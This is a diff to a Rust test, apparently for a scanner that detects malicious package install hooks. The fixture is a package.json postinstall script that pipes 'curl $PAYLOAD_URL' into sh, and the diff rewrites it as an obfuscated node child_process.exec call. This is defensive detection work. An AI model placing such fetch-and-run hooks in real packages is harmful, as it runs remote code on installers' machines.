@@ -132,7 +132,7 @@ fn test_scan_skill_file_enriches_variable_package_install_hook_download() {
         &package_json,
         r#"{
   "scripts": {
-    "postinstall": "curl\t$PAYLOAD_URL | sh"
+    "postinstall": "node -e \"require('child_process').exec('curl\t$PAYLOAD_URL | sh')\""
   }
 }"#,
     )
